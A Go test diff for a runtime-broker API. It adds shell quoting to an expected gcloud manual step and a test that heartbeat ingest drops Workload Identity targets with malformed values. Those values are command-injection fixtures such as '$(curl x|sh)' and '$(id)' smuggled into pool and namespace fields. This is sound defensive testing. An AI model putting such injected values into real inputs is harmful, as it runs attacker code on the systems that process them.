@@ -145,7 +145,7 @@ func TestMintGCPServiceAccount_WorkloadIdentityGrantFailureKeepsMint(t *testing.
 	b := resp.WorkloadIdentityBindings[0]
 	assert.Equal(t, api.WorkloadIdentityBindingSkipped, b.State)
 	assert.Equal(t, api.WorkloadIdentityReasonPermissionDenied, b.Reason)
-	assert.Contains(t, b.ManualStep, "gcloud iam service-accounts add-iam-policy-binding "+resp.Email)
+	assert.Contains(t, b.ManualStep, "gcloud iam service-accounts add-iam-policy-binding '"+resp.Email+"'")
 }
 
 // Experiment off: no Workload Identity call and no response field, exactly
@@ -210,6 +210,16 @@ func TestBrokerHeartbeat_WorkloadIdentityTargetsPersisted(t *testing.T) {
 	got = load(b.ID)
 	require.NotNil(t, got.WorkloadIdentityTargets, "an empty report is stored as empty, not as never reported")
 	assert.Empty(t, got.WorkloadIdentityTargets)
+
+	// Malformed entries are not stored; the valid one is.
+	mixed := []store.WorkloadIdentityTarget{
+		{Profile: "gke", Pool: "$(curl x|sh).svc.id.goog", Namespace: "agents"},
+		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "a$(id)"},
+		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"},
+	}
+	postHeartbeat(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &mixed})
+	assert.Equal(t, []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"}},
+		load(b.ID).WorkloadIdentityTargets, "malformed pool and namespace are dropped at ingest")
 
 	// A null field (unreadable settings) keeps the stored list too.
 	rec := doRequest(t, srv, http.MethodPost, "/api/v1/runtime-brokers/"+b.ID+"/heartbeat",
